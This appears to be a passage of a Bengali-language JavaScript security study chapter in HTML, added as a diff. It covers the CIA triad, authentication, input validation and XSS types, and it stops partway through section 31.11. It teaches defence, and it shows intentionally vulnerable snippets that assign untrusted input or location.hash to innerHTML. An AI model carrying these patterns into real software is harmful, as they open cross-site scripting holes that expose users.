@@ -1,0 +1,2216 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chapter 31 — JavaScript Security &amp; Web Security | JavaScript Master Study Documentation</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Hind+Siliguri:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --navy-deep: #0f172a;
+      --navy-mid: #1e293b;
+      --navy-light: #334155;
+      --blue-accent: #0284c7;
+      --blue-light: #e0f2fe;
+      --blue-dark: #0369a1;
+      --emerald: #059669;
+      --amber: #d97706;
+      --rose: #e11d48;
+      --bg-page: #f8fafc;
+      --bg-card: #ffffff;
+      --border-card: #e2e8f0;
+      --text-main: #0f172a;
+      --text-muted: #64748b;
+      --font-bengali: 'Hind Siliguri', sans-serif;
+      --font-heading: 'Plus Jakarta Sans', sans-serif;
+      --font-code: 'Fira Code', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-page);
+      color: var(--text-main);
+      font-family: var(--font-bengali);
+      font-size: 11px;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Print Controls */
+    .action-bar {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      background: #0f172a;
+      padding: 8px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #334155;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    .brand-title {
+      font-family: var(--font-heading);
+      font-weight: 700;
+      font-size: 12px;
+      color: #f8fafc;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .print-btn {
+      background: linear-gradient(135deg, #0284c7, #0369a1);
+      color: #ffffff;
+      border: none;
+      padding: 5px 12px;
+      border-radius: 5px;
+      font-family: var(--font-heading);
+      font-size: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 6px rgba(2, 132, 199, 0.3);
+    }
+    .print-btn:hover {
+      background: linear-gradient(135deg, #0369a1, #075985);
+      transform: translateY(-1px);
+    }
+
+    /* Container */
+    .doc-page {
+      max-width: 860px;
+      margin: 14px auto;
+      background: white;
+      padding: 20px 26px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+      border-radius: 8px;
+    }
+
+    /* Master Banner (Classic 1-10 Blue Gradient + Official JS Yellow Badge & Prominent Chapter Title) */
+    .master-banner {
+      background: linear-gradient(135deg, #075985 0%, #0369a1 50%, #0284c7 100%);
+      color: white;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 8px;
+      box-shadow: 0 4px 12px rgba(3, 105, 161, 0.2);
+    }
+    .banner-top {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 4px;
+    }
+    .banner-icon {
+      background: #f7df1e;
+      color: #000000;
+      font-family: var(--font-heading);
+      font-weight: 800;
+      font-size: 13px;
+      padding: 2px 7px;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.25);
+    }
+    .banner-title-group {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .banner-title {
+      font-family: var(--font-heading);
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      color: #ffffff;
+    }
+    .chapter-badge {
+      background: #f7df1e;
+      color: #000000;
+      font-family: var(--font-heading);
+      font-size: 12px;
+      font-weight: 800;
+      padding: 2px 8px;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+      letter-spacing: 0.5px;
+    }
+    .banner-sub {
+      font-size: 9.5px;
+      opacity: 0.95;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+      margin-bottom: 8px;
+      color: #e0f2fe;
+    }
+    .meta-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      background: rgba(15, 23, 42, 0.35);
+      padding: 6px 10px;
+      border-radius: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+    }
+    .meta-item {
+      font-size: 8.5px;
+    }
+    .meta-label {
+      color: #93c5fd;
+      text-transform: uppercase;
+      font-weight: 600;
+      font-size: 7.5px;
+      letter-spacing: 0.5px;
+    }
+    .meta-val {
+      font-weight: 600;
+      color: #ffffff;
+    }
+
+    /* Chapter Opening Statement Card */
+    .opening-card {
+      background: #f0f9ff;
+      border: 1px solid #bae6fd;
+      border-left: 3px solid var(--blue-accent);
+      border-radius: 6px;
+      padding: 8px 12px;
+      margin-bottom: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+    }
+    .opening-title {
+      font-family: var(--font-heading);
+      font-size: 11.5px;
+      font-weight: 700;
+      color: var(--blue-dark);
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .roadmap-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 4px;
+      margin-top: 5px;
+      padding-top: 5px;
+      border-top: 1px dashed #bae6fd;
+    }
+    .roadmap-item {
+      background: white;
+      border: 1px solid #e0f2fe;
+      border-radius: 4px;
+      padding: 3px 5px;
+      font-size: 8.5px;
+      color: #0369a1;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+    }
+
+    /* Part Banners */
+    .part-banner {
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      color: #ffffff;
+      font-family: var(--font-heading);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.6px;
+      padding: 5px 10px;
+      border-radius: 5px;
+      margin: 8px 0 6px 0;
+      border-left: 3px solid #38bdf8;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+      page-break-after: avoid !important;
+      break-after: avoid !important;
+      page-break-inside: avoid !important;
+      break-inside: avoid !important;
+    }
+
+    /* Study Cards */
+    .study-card {
+      background: #ffffff;
+      border: 1px solid var(--border-card);
+      border-radius: 6px;
+      padding: 8px 11px;
+      margin-bottom: 7px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+      page-break-inside: avoid !important;
+      break-inside: avoid !important;
+    }
+    .card-title {
+      font-family: var(--font-heading);
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--navy-deep);
+      margin-bottom: 5px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border-bottom: 1px solid #f1f5f9;
+      padding-bottom: 3px;
+    }
+    .badge-num {
+      background: var(--blue-accent);
+      color: white;
+      font-size: 9px;
+      font-weight: 700;
+      padding: 1px 5px;
+      border-radius: 3px;
+      font-family: var(--font-code);
+    }
+
+    /* Typography inside cards */
+    .text-p {
+      margin-bottom: 4px;
+      color: #334155;
+      font-size: 10.5px;
+      line-height: 1.45;
+    }
+    .section-subhead {
+      font-family: var(--font-heading);
+      font-size: 10.5px;
+      font-weight: 700;
+      color: var(--navy-light);
+      margin-top: 4px;
+      margin-bottom: 3px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .def-box {
+      background: #f8fafc;
+      border-left: 3px solid #64748b;
+      padding: 5px 8px;
+      border-radius: 0 4px 4px 0;
+      font-size: 10px;
+      margin: 4px 0;
+      color: #334155;
+    }
+    .warn-box {
+      background: #fff1f2;
+      border-left: 3px solid #f43f5e;
+      padding: 5px 8px;
+      border-radius: 0 4px 4px 0;
+      font-size: 10px;
+      margin: 4px 0;
+      color: #9f1239;
+    }
+
+    /* Code Blocks */
+    .code-box {
+      background: #0f172a;
+      border-radius: 5px;
+      margin: 4px 0 5px 0;
+      overflow: hidden;
+      border: 1px solid #1e293b;
+      page-break-inside: avoid !important;
+      break-inside: avoid !important;
+    }
+    .code-box-error {
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      border-left: 3px solid #ef4444;
+    }
+    .code-box-correct {
+      border: 1px solid rgba(34, 197, 94, 0.4);
+      border-left: 3px solid #22c55e;
+    }
+    .code-top {
+      background: #1e293b;
+      color: #94a3b8;
+      font-family: var(--font-code);
+      font-size: 8.5px;
+      padding: 2.5px 8px;
+      display: flex;
+      justify-content: space-between;
+      border-bottom: 1px solid #334155;
+      text-transform: uppercase;
+    }
+    .code-box pre {
+      margin: 0;
+      padding: 6px 10px;
+      overflow-x: hidden !important;
+      white-space: pre-wrap !important;
+      word-break: break-word !important;
+    }
+    .code-box code {
+      font-family: var(--font-code);
+      font-size: 9px;
+      line-height: 1.35;
+      color: #f1f5f9;
+      white-space: pre-wrap !important;
+      word-break: break-word !important;
+    }
+    .syn-kw { color: #f472b6; font-weight: 600; }
+    .syn-fn { color: #38bdf8; font-weight: 600; }
+    .syn-str { color: #4ade80; }
+    .syn-num { color: #fb923c; }
+    .syn-com { color: #64748b; font-style: italic; }
+    .syn-bool { color: #c084fc; font-weight: 600; }
+
+    /* Output Box */
+    .output-box {
+      background: #182234;
+      border-left: 3px solid #10b981;
+    }
+    .out-label {
+      color: #34d399;
+      font-weight: 700;
+    }
+
+    /* ASCII Diagrams with Pre & White-space: Pre & Colorful Highlights */
+    .ascii-tree-container {
+      background: #090d16;
+      border: 1px solid #1e293b;
+      border-radius: 6px;
+      margin: 5px 0;
+      overflow: hidden;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.18);
+      page-break-inside: avoid !important;
+      break-inside: avoid !important;
+    }
+    .ascii-tree-header {
+      background: #111c2e;
+      color: #38bdf8;
+      font-family: var(--font-code);
+      font-size: 9px;
+      font-weight: 700;
+      padding: 4px 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid #1e293b;
+    }
+    .ascii-tree-content {
+      color: #e2e8f0 !important;
+      font-family: var(--font-code) !important;
+      font-size: 9.5px !important;
+      line-height: 1.35 !important;
+      padding: 8px 12px !important;
+      background: transparent !important;
+      border: none !important;
+      white-space: pre !important;
+      overflow-x: hidden !important;
+      word-break: normal !important;
+      margin: 0 !important;
+    }
+
+    /* Practice Lab Items */
+    .practice-item {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-left: 3px solid var(--blue-accent);
+      border-radius: 5px;
+      padding: 6px 9px;
+      margin-bottom: 6px;
+      page-break-inside: avoid !important;
+      break-inside: avoid !important;
+    }
+
+    /* Master Tables */
+    .table-container {
+      margin: 6px 0;
+      border-radius: 6px;
+      overflow: hidden;
+      border: 1px solid #e2e8f0;
+    }
+    .master-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 9.5px;
+    }
+    .master-table th {
+      background: #1e293b;
+      color: #f8fafc;
+      font-weight: 700;
+      padding: 5px 8px;
+      text-align: left;
+      border-bottom: 1px solid #334155;
+    }
+    .master-table td {
+      padding: 5px 8px;
+      border-bottom: 1px solid #f1f5f9;
+      color: #334155;
+    }
+    .master-table tr:nth-child(even) {
+      background: #f8fafc;
+    }
+
+    /* Print Optimization Rules */
+    @page {
+      size: A4;
+      margin: 8mm 10mm;
+    }
+
+    @media print {
+      body {
+        background: white !important;
+        font-size: 10px !important;
+      }
+      .action-bar {
+        display: none !important;
+      }
+      .doc-page {
+        max-width: 100% !important;
+        margin: 0 !important;
+        padding: 0 !important;
+        border: none !important;
+        box-shadow: none !important;
+      }
+      #sec-31-1 {
+        page-break-after: always !important;
+        break-after: page !important;
+        margin-bottom: 0 !important;
+      }
+      .study-card, .practice-item {
+        page-break-inside: avoid !important;
+        break-inside: avoid !important;
+        border: 1px solid #cbd5e1;
+      }
+      .part-banner {
+        page-break-after: avoid !important;
+        break-after: avoid !important;
+      }
+      .code-box, pre, .ascii-tree-container, .table-container, .def-box, .output-box, .warn-box {
+        page-break-inside: avoid !important;
+        break-inside: avoid !important;
+      }
+      pre {
+        overflow-x: hidden !important;
+        white-space: pre-wrap !important;
+        word-break: break-word !important;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Sticky Top Print Nav -->
+  <div class="action-bar">
+    <div class="brand-title">
+      <span style="color:#f7df1e; font-weight:800; font-family:var(--font-code); background:#000; padding:1px 4px; border-radius:3px;">JS</span> MASTER STUDY DOCUMENTATION
+    </div>
+    <button class="print-btn" onclick="window.print()">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 6 2 18 2 18 9"></polyline><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><rect x="6" y="14" width="12" height="8"></rect></svg>
+      Print / Save as PDF
+    </button>
+  </div>
+
+  <div class="doc-page">
+
+    <!-- Header Master Banner (Classic 1-10 Style + JS Yellow & Prominent Chapter Title) -->
+    <header class="master-banner">
+      <div class="banner-top">
+        <div class="banner-icon">JS</div>
+        <div class="banner-title-group">
+          <span class="banner-title">JavaScript Master Study Documentation</span>
+          <span class="chapter-badge">Chapter 31</span>
+        </div>
+      </div>
+      <div class="banner-sub">JAVASCRIPT SECURITY, WEB ATTACK VECTORS &amp; DEFENSIVE RUNTIME ARCHITECTURE</div>
+      <div class="meta-grid">
+        <div class="meta-item">
+          <div class="meta-label">Total Modules</div>
+          <div class="meta-val">70 Modules + Practice Lab</div>
+        </div>
+        <div class="meta-item">
+          <div class="meta-label">Curriculum Part</div>
+          <div class="meta-val">Part 25 — Web &amp; JS Security</div>
+        </div>
+        <div class="meta-item">
+          <div class="meta-label">Core Mechanics</div>
+          <div class="meta-val">XSS, CSRF, CORS, CSP, JWT &amp; SOP</div>
+        </div>
+        <div class="meta-item">
+          <div class="meta-label">Reference Standard</div>
+          <div class="meta-val">OWASP Top 10 / W3C WebAppSec / RFC 6749</div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Chapter Opening Statement (Page 1 Balance) -->
+    <div class="opening-card">
+      <div class="opening-title">
+        <span>🛡️</span> JavaScript Security &amp; Web Security — ডিফেন্সিভ আর্কিটেকচার শেখার মূল উদ্দেশ্য
+      </div>
+      <p class="text-p">
+        JavaScript দিয়ে শুধু ওয়েবসাইট বানালেই হবে না—<strong>Website-এর Data, User Account, API, Authentication এবং Browser Interaction কীভাবে নিরাপদ রাখা যায়</strong> সেটাও একজন পেশাদার ইঞ্জিনিয়ারের জানা বাধ্যতামূলক। এই চ্যাপ্টারে আমরা <strong>XSS, CSRF, CORS, CSP, Secure Cookies, JWT, Prototype Pollution, Clickjacking, HTTPS</strong> এবং আধুনিক মাল্টি-লেয়ার ডিফেন্স সিস্টেম গভীরভাবে শিখব।
+      </p>
+      <div class="roadmap-grid">
+        <div class="roadmap-item"><span>📌</span> 1. CIA Triad</div>
+        <div class="roadmap-item"><span>📌</span> 2. Auth vs AuthZ</div>
+        <div class="roadmap-item"><span>📌</span> 3. XSS Sinks</div>
+        <div class="roadmap-item"><span>📌</span> 4. CSRF Traps</div>
+        <div class="roadmap-item"><span>📌</span> 5. SOP &amp; CORS</div>
+        <div class="roadmap-item"><span>📌</span> 6. HttpOnly Cookies</div>
+        <div class="roadmap-item"><span>📌</span> 7. JWT Security</div>
+        <div class="roadmap-item"><span>📌</span> 8. Prototype Pollution</div>
+        <div class="roadmap-item"><span>📌</span> 9. Secure Headers</div>
+        <div class="roadmap-item"><span>📌</span> 10. Multi-Layer Defense</div>
+      </div>
+    </div>
+    <div class="part-banner">Part 01 — Web Security Fundamentals, CIA Triad & Input Validation (31.1 – 31.6)</div>
+    <div class="study-card" id="sec-31-1">
+      <div class="card-title"><span class="badge-num">31.1</span> Web Security কী?</div>
+      <p class="text-p"><strong>Web Security</strong> হলো website/web application-এর:</p>
+      <ul style="margin: 2px 0 5px 16px; color: #334155; font-size: 10.5px;">
+        <li>User</li>
+        <li>Data</li>
+        <li>Authentication</li>
+        <li>API</li>
+        <li>Server</li>
+        <li>Browser interaction</li>
+        <li>Session</li>
+      </ul>
+      <p class="text-p">এসবকে unauthorized access, manipulation এবং malicious input থেকে নিরাপদ রাখা। একটি secure application:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ MULTI-TIER WEB SECURITY FLOW</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Frontend</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">API</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Backend</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Database</span></pre>
+</div>
+      <p class="text-p">প্রতিটি layer-এই security দরকার।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.2</span> Security-এর 3টি মূল লক্ষ্য — CIA Triad</div>
+      <p class="text-p">Web security বুঝতে এই ৩টি concept খুব গুরুত্বপূর্ণ।</p>
+      <div class="section-subhead">🔹 C — Confidentiality</div>
+      <p class="text-p">যে data যার দেখার কথা নয় সে যেন দেখতে না পারে। Example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User A</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">User A</span>&#x27;s private profile</pre>
+</div>
+      <p class="text-p">User B যেন সেটা দেখতে না পারে।</p>
+      <div class="section-subhead">🔹 I — Integrity</div>
+      <p class="text-p">Data unauthorizedভাবে পরিবর্তন করা যাবে না। Example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Bank balance
+৳10,000</pre>
+</div>
+      <p class="text-p">কেউ unauthorizedভাবে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">৳10,000 <span style="color: #38bdf8; font-weight: 700;">→</span> ৳<span style="color: #fb923c; font-weight: 700;">100,000</span></pre>
+</div>
+      <p class="text-p">করতে পারবে না।</p>
+      <div class="section-subhead">🔹 A — Availability</div>
+      <p class="text-p">System প্রয়োজনের সময় available থাকবে।</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Website
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Users can access</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.3</span> Authentication vs Authorization</div>
+      <p class="text-p">দুটো খুব ভালোভাবে বুঝবে।</p>
+      <div class="section-subhead">🔹 Authentication</div>
+      <div class="warn-box">⚠️ তুমি কে?</div>
+      <p class="text-p">Example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Email
++
+Password</pre>
+</div>
+      <p class="text-p">Login করার পর:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">You are Ripon</pre>
+</div>
+      <div class="section-subhead">🔹 Authorization</div>
+      <div class="warn-box">⚠️ তুমি কী করতে পারো?</div>
+      <p class="text-p">Example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Student
+<span style="color: #38bdf8; font-weight: 700;">→</span> View own result
+
+Teacher
+<span style="color: #38bdf8; font-weight: 700;">→</span> Enter marks
+
+Admin
+<span style="color: #38bdf8; font-weight: 700;">→</span> Manage users</pre>
+</div>
+      <p class="text-p">অর্থাৎ:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #c084fc; font-weight: 700;">Authentication</span> = Who are you?
+<span style="color: #c084fc; font-weight: 700;">Authorization</span> = What are you allowed to do?</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.4</span> Input Validation কী?</div>
+      <p class="text-p">User input expected format-এ আছে কি না check করা।</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">const</span> age = <span class="syn-num">23</span>;
+
+<span class="syn-kw">if</span> (age &lt; <span class="syn-num">18</span>) {
+    <span class="syn-fn">console</span>.log(&quot;Not allowed&quot;);
+}</code></pre>
+</div>
+      <p class="text-p">Form:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTML INJECTION VECTOR</span><span>HTML</span></div>
+  <pre><code><span style="color:#f472b6; font-weight:600;">&lt;input</span> <span style="color:#38bdf8;">type=</span>&quot;email&quot; required<span style="color:#f472b6; font-weight:600;">&gt;</span></code></pre>
+</div>
+      <p class="text-p">Validation হতে পারে:</p>
+      <ul style="margin: 2px 0 5px 16px; color: #334155; font-size: 10.5px;">
+        <li>Client-side</li>
+        <li>Server-side</li>
+      </ul>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.5</span> Client-side Validation যথেষ্ট নয়</div>
+      <p class="text-p">ধরো:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTML INJECTION VECTOR</span><span>HTML</span></div>
+  <pre><code><span style="color:#f472b6; font-weight:600;">&lt;input</span> <span style="color:#38bdf8;">type=</span>&quot;number&quot; min=&quot;18&quot;<span style="color:#f472b6; font-weight:600;">&gt;</span></code></pre>
+</div>
+      <p class="text-p">Browser UI-তে user 18-এর নিচে value দিতে পারছে না। কিন্তু attacker browser-এর বাইরে সরাসরি API call করতে পারে। তাই:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">Frontend</span> validation
+        +
+<span style="color: #fde047; font-weight: 600;">Backend</span> validation</pre>
+</div>
+      <p class="text-p">দুটো দরকার।</p>
+      <div class="section-subhead">🔹 🔥 Golden Rule</div>
+      <div class="warn-box">⚠️ <strong>Never trust client-side input.</strong></div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.6</span> Validation vs Sanitization</div>
+      <p class="text-p">দুটো এক নয়।</p>
+      <div class="section-subhead">🔹 Validation</div>
+      <p class="text-p">Input acceptable কি না check করে।</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Age = 25
+<span style="color: #4ade80; font-weight: bold;">✓</span> <span style="color: #34d399; font-weight: 700;">Valid</span></pre>
+</div>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Age = &quot;hello&quot;
+<span style="color: #f43f5e; font-weight: bold;">✗</span> Invalid</pre>
+</div>
+      <div class="section-subhead">🔹 Sanitization</div>
+      <p class="text-p">Input-এর potentially dangerous অংশ remove/transform করার চেষ্টা করে। উদাহরণ:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User</span>-provided HTML
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Sanitize
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Safer HTML</pre>
+</div>
+    </div>
+    <div class="part-banner">Part 02 — Cross-Site Scripting (XSS) Attacks, DOM Sinks & CSP Defense (31.7 – 31.15)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.7</span> XSS — Cross-Site Scripting</div>
+      <p class="text-p">XSS হলো এমন vulnerability যেখানে attacker-controlled content webpage-এর context-এ script হিসেবে execute হওয়ার সুযোগ পায়। ধরো application user-এর comment HTML হিসেবে সরাসরি render করে। Dangerous pattern:</p>
+      <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">JAVASCRIPT Source</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code>element.<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = userInput;</code></pre>
+</div>
+      <p class="text-p">যদি <code>userInput</code> untrusted হয়, security problem হতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.8</span> XSS-এর Basic Idea</div>
+      <p class="text-p">ধরো:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ XSS INJECTION & EXECUTION PIPELINE</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User</span> Input
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Website blindly trusts it
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Browser</span> interprets it as HTML/Script
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Unexpected code execution</pre>
+</div>
+      <p class="text-p">এটাই XSS-এর core concept।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.9</span> XSS-এর Types</div>
+      <p class="text-p">সাধারণভাবে:</p>
+      <div class="section-subhead">🔹 1. Stored XSS</div>
+      <p class="text-p">Malicious input server/database-এ save হয়।</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #f43f5e; font-weight: 700;">Attacker</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Comment
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Database</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Victim opens page
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #c084fc; font-weight: 700;">Payload</span> executes</pre>
+</div>
+      <div class="section-subhead">🔹 2. Reflected XSS</div>
+      <p class="text-p">Input request-এর মাধ্যমে আসে এবং response-এ unsafeভাবে reflect হয়।</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Request
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Server</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Response
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Browser</span></pre>
+</div>
+      <div class="section-subhead">🔹 3. DOM-based XSS</div>
+      <p class="text-p">Client-side JavaScript unsafeভাবে DOM manipulate করার কারণে vulnerability তৈরি হয়। উদাহরণ:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>element.<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = <span class="syn-fn">location</span>.<span style="color: #38bdf8; font-weight: 600;">hash</span>;</code></pre>
+</div>
+      <p class="text-p">এখানে untrusted URL-derived data DOM-এ unsafeভাবে বসানো হচ্ছে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.10</span> Dangerous DOM APIs</div>
+      <p class="text-p">বিশেষভাবে সতর্ক:</p>
+      <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">JAVASCRIPT Source</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span>
+<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">outerHTML</span>
+insertAdjacentHTML()
+<span class="syn-fn">document</span>.write()</code></pre>
+</div>
+      <p class="text-p">সবসময় এগুলো vulnerable নয়, কিন্তু <strong>untrusted input</strong> নিয়ে ব্যবহার করলে risk তৈরি হতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.11</span> <code>innerHTML</code> বনাম <code>textContent</code></div>
+      <p class="text-p">ধরো user input:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">const</span> input = userInput;</code></pre>
+</div>
+      <p class="text-p">Unsafe pattern:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
